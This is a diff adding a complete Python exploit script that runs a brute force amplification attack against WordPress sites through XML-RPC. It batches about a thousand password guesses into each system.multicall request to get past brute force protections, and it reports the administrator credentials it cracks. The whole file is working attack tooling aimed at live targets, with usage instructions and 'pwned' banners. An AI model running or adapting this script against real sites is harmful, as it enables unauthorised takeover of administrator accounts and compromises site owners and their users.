@@ -1,0 +1,118 @@
+#!/usr/bin/python3
+# Wordpress XML-RPC Brute Force Amplification Exploit by Trancap
+# Last Updated: 2016/06/24
+#
+# ABOUT: This exploit launches a brute force amplification attack on target Wordpress sites. Since XMLRPC allows multiple auth calls per request, amplification is possible and standard brute force protection will not block the attack.
+#
+# USAGE: ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username
+#
+
+
+import xml.etree.ElementTree as ET
+from xml.sax.saxutils import escape
+import requests
+import math
+import sys
+
+class bcolors:
+  HEADER    = '\033[95m'
+  OKBLUE    = '\033[94m'
+  OKGREEN   = '\033[92m'
+  WARNING   = '\033[93m'
+  FAIL      = '\033[91m'
+  ENDC      = '\033[0m'
+  BOLD      = '\033[1m'
+  UNDERLINE = '\033[4m'
+
+def parse_response(data):
+  root = ET.fromstring(data)
+  struct_nodes = root.findall(".//struct")
+  count = 0
+
+  for struct_node in struct_nodes:
+    for members_node in struct_node:
+      for member_node in members_node:
+        if member_node.text and "isAdmin" in member_node.text:
+          return True, count
+    count += 1
+
+  return False, count
+
+def send_payload(url, user, passwords):
+  prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
+  payload = ""
+  suffix = "</data></array></value></param></params></methodCall>"
+
+  for password in passwords:
+    payload += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
+    payload += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + escape(password) + "</string></value>"
+    payload += "</data></array></value></data></array></value></member></struct></value>"
+
+  data = prefix + payload + suffix 
+  headers = {"Content-Type": "application/xml"}
+  r = requests.post(url, data=data, headers=headers)
+  r.encoding = 'UTF-8'
+  #print(r.text)
+  return r.text
+
+def main(argv):
+  if len(argv) < 3:
+    print(bcolors.OKBLUE + "+ -- --=[Usage: {0} http://wordpress.org/xmlrpc.php passwords.txt username".format(argv[0]) + bcolors.ENDC)
+    sys.exit(0)
+
+  url = argv[1] # SET TARGET
+  wordlist = argv[2] # SET CUSTOM WORDLIST
+  user = argv[3] # SET CUSTOM USERNAMELIST
+  
+  print(bcolors.OKBLUE + "" + bcolors.ENDC)
+  print(bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC)
+  print(bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC)
+  print(bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC)
+  print(bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC)
+  print(bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC)
+  print(bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC)
+  print(bcolors.OKBLUE + "" + bcolors.ENDC)
+  print(bcolors.OKBLUE + "    \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC)
+  print(bcolors.OKBLUE + "     X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
+  print(bcolors.OKBLUE + '    / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC)
+  print(bcolors.OKBLUE + "" + bcolors.ENDC)
+  print("")
+  print(bcolors.OKBLUE + "--=[XML-RPC Brute Force Exploit by trancap" + "]=--" + bcolors.ENDC)
+  print(bcolors.WARNING + "--=[Brute forcing target: " + url + "]=--" + bcolors.ENDC)
+
+  passwords = []
+  iterations = 1 
+  count = 0
+
+  print(bcolors.WARNING + "--=[Starting Brute Force Enumeration...]=--" + bcolors.ENDC)
+
+  with open(wordlist, encoding="ISO-8859-1") as f:
+    for line in f:
+      passwords.append(line.rstrip()) 
+      if count == 999:
+
+        response = send_payload(url, user, passwords)
+        found, index = parse_response(response)
+        if found:
+          print(bcolors.OKGREEN + "--=[w00t! User found! Wordpress is pwned! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
+          print(bcolors.OKGREEN + "--=[Brute Force Amplification Attack Successful!]=--" + bcolors.ENDC)
+          sys.exit(0)
+        else:
+          print(bcolors.FAIL + "--=[Tried: " + str(iterations * 1000) + " passwords]=--" + bcolors.ENDC)
+        del passwords[:]
+        iterations += 1
+        count = 0
+      count += 1
+
+  if passwords:
+    response = send_payload(url, user, passwords)
+    found, index = parse_response(response)
+    if found:
+      print(bcolors.OKGREEN + "--=[w00t! User found! Wordpress is pwned! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
+      print(bcolors.OKGREEN + "--=[Brute Force Amplification Attack Successful!]=--" + bcolors.ENDC)
+      sys.exit(0)
+
+  print(bcolors.FAIL + "--=[Brute force failed]=--" + bcolors.ENDC)
+
+main(sys.argv)
+
